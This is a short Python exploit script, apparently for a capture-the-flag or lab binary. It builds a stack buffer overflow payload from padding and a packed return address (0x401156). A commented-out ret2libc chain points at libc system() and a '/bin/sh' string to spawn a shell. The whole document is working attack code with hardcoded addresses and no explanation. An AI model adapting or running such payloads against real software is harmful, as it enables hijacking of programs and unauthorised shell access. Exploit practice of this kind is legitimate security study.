import struct

padding = 'aaaabbbbccccddeeee'
#binsh = '\x9a\x7e\xb9\xf7\xff\x7f'
system1 = struct.pack('I', 0xf7a33440)
system2 = struct.pack('I', 0x7fff)
return_after_sys = 'a'*8
binsh1 = struct.pack('I', 0xf7b97e9a)
binsh2 = struct.pack('I', 0x7fff)
#print(padding + system1 + system2 + return_after_sys + binsh1 + binsh2)

stack = struct.pack('I', 0xffffdee8)
stack2 = struct.pack('I', 0x0000)
print(padding + struct.pack('I', 0x401156) + stack2)
# ffffdee8
# 0x401200
